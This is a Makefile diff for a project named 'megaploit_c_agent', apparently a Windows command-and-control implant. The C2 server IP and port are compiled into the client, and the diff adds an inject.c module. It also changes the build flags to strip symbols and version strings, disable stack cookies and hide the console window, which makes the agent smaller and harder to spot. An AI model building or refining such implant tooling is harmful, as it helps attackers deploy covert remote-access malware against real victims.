@@ -65,6 +65,7 @@ NAME     ?= megaploit_c_agent
 CLIENT_SRCS := client/main.c   \
                client/ntcalls.c \
                client/shell.c   \
+               client/inject.c  \
                tls/tls_client.c
 
 # Legacy single-file build (Source.c + shared tls/tls_client.c)
@@ -81,17 +82,33 @@ SERVER_LEGACY_SRCS := serverShell.c
 # MSVC flags
 # ---------------------------------------------------------------------------
 
-MSVC_CFLAGS  := /nologo /W3 /O2 /DNDEBUG \
+# /O1        — optimise for size (smaller than /O2 for agent use)
+# /GS-       — disable stack buffer security cookies (saves ~1 KB overhead)
+# /Gy        — function-level linking (linker can dead-strip unused funcs)
+# /DNDEBUG   — strip asserts and debug strings
+# /GL        — whole-program optimisation
+# /link /OPT:REF /OPT:ICF — dead-code elimination at link time
+MSVC_CFLAGS  := /nologo /W3 /O1 /GS- /Gy /GL /DNDEBUG \
                 /DC2_IP=\"$(C2_IP)\" /DC2_PORT=$(C2_PORT)
+MSVC_LDFLAGS := /OPT:REF /OPT:ICF /LTCG
 MSVC_LIBS    := Secur32.lib Crypt32.lib ws2_32.lib bcrypt.lib Advapi32.lib User32.lib
 
 # ---------------------------------------------------------------------------
 # MinGW flags
 # ---------------------------------------------------------------------------
 
-MINGW_CFLAGS := -O2 -DNDEBUG -DUNICODE -D_UNICODE -DSECURITY_WIN32 \
+# -Os          — optimise for size
+# -s           — strip all symbols from the output binary
+# -ffunction-sections / -fdata-sections + --gc-sections — dead code removal
+# -fno-ident   — omit GCC version string from binary
+# -fno-asynchronous-unwind-tables — strip .eh_frame / .pdata (saves ~10-15%)
+# -mwindows    — GUI subsystem: no console window, no AllocConsole needed
+MINGW_CFLAGS := -Os -s -DNDEBUG -DUNICODE -D_UNICODE -DSECURITY_WIN32 \
+                -ffunction-sections -fdata-sections                     \
+                -fno-ident -fno-asynchronous-unwind-tables              \
                 -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
-MINGW_LIBS   := -lsecur32 -lcrypt32 -lws2_32 -lbcrypt -ladvapi32 -luser32 -mwindows
+MINGW_LDFLAGS := -Wl,--gc-sections -Wl,--strip-all
+MINGW_LIBS    := -lsecur32 -lcrypt32 -lws2_32 -lbcrypt -ladvapi32 -luser32 -mwindows
 
 # ---------------------------------------------------------------------------
 # Detect MSVC vs MinGW
@@ -104,11 +121,11 @@ ifeq ($(CC),$(CC_MSVC))
   SERVER_OUT := serverShell.exe
 
   client:
-	$(CC) $(MSVC_CFLAGS) $(CLIENT_SRCS) /link $(MSVC_LIBS) /out:$(CLIENT_OUT)
+	$(CC) $(MSVC_CFLAGS) $(CLIENT_SRCS) /link $(MSVC_LDFLAGS) $(MSVC_LIBS) /out:$(CLIENT_OUT)
 	@echo [+] Client built: $(CLIENT_OUT)
 
   legacy:
-	$(CC) $(MSVC_CFLAGS) $(LEGACY_SRCS) /link $(MSVC_LIBS) /out:$(LEGACY_OUT)
+	$(CC) $(MSVC_CFLAGS) $(LEGACY_SRCS) /link $(MSVC_LDFLAGS) $(MSVC_LIBS) /out:$(LEGACY_OUT)
 	@echo [+] Legacy client built: $(LEGACY_OUT)
 
   server:
@@ -124,11 +141,11 @@ else
   SERVER_OUT := serverShell.exe
 
   client:
-	$(CC) $(MINGW_CFLAGS) $(CLIENT_SRCS) -o $(CLIENT_OUT) $(MINGW_LIBS)
+	$(CC) $(MINGW_CFLAGS) $(CLIENT_SRCS) -o $(CLIENT_OUT) $(MINGW_LDFLAGS) $(MINGW_LIBS)
 	@echo "[+] Client built: $(CLIENT_OUT)"
 
   legacy:
-	$(CC) $(MINGW_CFLAGS) $(LEGACY_SRCS) -o $(LEGACY_OUT) $(MINGW_LIBS)
+	$(CC) $(MINGW_CFLAGS) $(LEGACY_SRCS) -o $(LEGACY_OUT) $(MINGW_LDFLAGS) $(MINGW_LIBS)
 	@echo "[+] Legacy client built: $(LEGACY_OUT)"
 
   server:
